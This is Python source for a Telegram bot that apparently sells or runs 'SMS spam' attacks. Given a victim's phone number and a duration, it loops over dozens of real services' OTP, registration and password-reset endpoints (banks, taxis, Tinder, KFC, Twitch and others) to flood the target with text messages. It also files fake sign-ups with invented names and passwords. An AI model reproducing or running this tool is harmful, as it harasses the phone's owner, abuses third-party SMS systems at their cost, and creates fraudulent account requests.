# Created by Delitel
import requests
import telebot
import cfg, db
import random
import time

bot = telebot.TeleBot(cfg.token)


def convert_number(phone_number):

    if phone_number[0] == '+':
        phone_after = phone_number[1:]
    elif phone_number[0] == '8':
        phone_after = '7' + phone_number[1:]
    elif phone_number[0] == '9':
        phone_after = '7' + phone_number

    return phone_after


def bomber(user_id, seconds, phone):
    convert_phone = phone

    name = ''
    chars = "123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
    for x in range(12):
        name = name + random.choice(chars)
        password = name + random.choice(chars)
        username = name + random.choice(chars)

    _phone9 = convert_phone[1:]
    _phoneAresBank = '+' + convert_phone[0] + '(' + convert_phone[1:4] + ')' + convert_phone[4:7] + '-' + convert_phone[7:9] + '-' + convert_phone[9:11]
    _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
    _phoneOstin = '+' + convert_phone[0] + '+(' + convert_phone[1:4] + ')' + convert_phone[4:7] + '-' + convert_phone[7:9] + '-' + convert_phone[9:11]
    _phonePizzahut = '+' + convert_phone[0] + ' (' + convert_phone[1:4] + ') ' + convert_phone[4:7] + ' ' + convert_phone[7:9] + ' ' + convert_phone[9:11]
    _phoneGorzdrav = convert_phone[1:4] + ') ' + convert_phone[4:7] + '-' + convert_phone[7:9] + '-' + convert_phone[9:11]

    iteration = 0
    start_time = time.time()
    db.act_count_attack("add",user_id)
    bot.send_message(user_id,"Телефон: <code>"+convert_phone+"</code>\nСмс спам начался!",parse_mode="html")
    while True:
        if time.time() - start_time >= float(seconds):
            bot.send_message(user_id,"Телефон: <code>"+convert_phone+"</code>\nСмс спам окончен!",parse_mode="html")
            db.act_count_attack("remove",user_id)
            break
        else:
            _email = name + str(iteration) + '@gmail.com'
            email = name + str(iteration) + '@gmail.com'

            try:
                requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',data={'phoneNumber': convert_phone, 'countryCode': 'ID', 'name': 'test','email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            except:
                pass

            try:
                requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            except:
                pass

            try:
                requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': convert_phone}, headers={})
            except:
                pass

            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': convert_phone}, headers={})
            except:
                pass

            try:
                requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': convert_phone}, headers={})
            except:
                pass

            try:
                requests.post('https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=RznyziZkeagDbs6SLIr13ZlfSjusxJbQ.m1-prod-api26&wuid=31ad89052c4944fd8cd55bcf419eefc1',data={"phone": convert_phone},headers={'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive','Host': 'api.tinkoff.ru', 'origin': 'https://www.tinkoff.ru','Referer': 'https://www.tinkoff.ru/login/'})
            except:
                pass

            try:
                requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': convert_phone}, headers={})
            except:
                pass

            try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': convert_phone})
            except:
                pass

            try:
                requests.post('https://pizzahut.ru/account/password-reset',data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,'_token': '*'})
            except:
                pass

            try:
                requests.post('https://www.rabota.ru/remind', data={'credential': convert_phone})
            except:
                pass

            try:
                requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + convert_phone})
            except:
                pass

            try:
                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + convert_phone + '/')
            except:
                pass

            try:
                requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',data={'name': name, 'phone': convert_phone, 'promo': 'yellowforma'})
            except:
                pass

            try:
                requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            except:
                pass

            try:
                requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},data={'phone': convert_phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
            except:
                pass

            try:
                requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': convert_phone, 'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            except:
                pass

            try:
                requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': convert_phone})
            except:
                pass

            try:
                requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={'client_type': 'personal', 'email': _email, 'mobile_phone': convert_phone,'deliveryOption': 'sms'})
            except:
                pass

            try:
                requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': convert_phone})
            except:
                pass

            try:
                requests.post('https://online.sbis.ru/reg/service/',json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика','params': {'phone': convert_phone}, 'id': '1'})
            except:
                pass

            try:
                requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1','birthDate': '10.10.2000', 'mobilePhone': _phone9,'russianFederationResident': 'true', 'isDSA': 'false','personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null','promotionAgreement': 'true'})
            except:
                pass

            try:
                requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': convert_phone})
            except:
                pass

            try:
                requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': convert_phone})
            except:
                pass

            try:
                requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',json={'phone': '+' + convert_phone})
            except:
                pass

            try:
                requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": convert_phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            except:
                pass

            try:
                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + convert_phone + '/')
            except:
                pass

            try:
                requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": convert_phone, "SignupForm[device_type]": 3})
            except:
                pass

            try:
                requests.get('https://findclone.ru/register', params={'phone': '+' + convert_phone})
            except:
                pass

            try:
                requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": convert_phone}})
            except:
                pass

            try:
                requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': convert_phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',"k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            except:
                pass

            try:
                requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + convert_phone, "phone_permission": "unknown","stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown","devicemodel": "unknown"})
            except:
                pass

            try:
                requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": password, "application": "lkp", "login": "+" + convert_phone})
            except:
                pass

            try:
                requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": convert_phone})
            except:
                pass

            try:
                requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": convert_phone})
            except:
                pass

            try:
                requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + convert_phone, "api": 2, "email": "email", "x-email": "x-email"})
            except:
                pass

            try:
                requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + convert_phone})
            except:
                pass

            try:
                requests.post('https://plink.tech/register/', json={"phone": convert_phone})
            except:
                pass

            try:
                requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": convert_phone})
            except:
                pass

            try:
                requests.post("http://smsgorod.ru/sendsms.php", data={"number": convert_phone})
            except:
                pass

            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': convert_phone})
            except:
                pass

            try:
                requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": convert_phone, "username": username})
            except:
                pass

            try:
                requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': convert_phone},headers={'App-ID': 'cabinet'})
            except:
                pass

            try:
                requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": convert_phone, "type": 2})
            except:
                pass

            try:
                requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + convert_phone})
            except:
                pass

            try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': convert_phone})
            except:
                pass

            try:
                requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": convert_phone,"deliveryOption": "sms"})
            except:
                pass

            try:
                requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": convert_phone})
            except:
                pass

            try:
                requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": convert_phone})
            except:
                pass

            iteration += 1


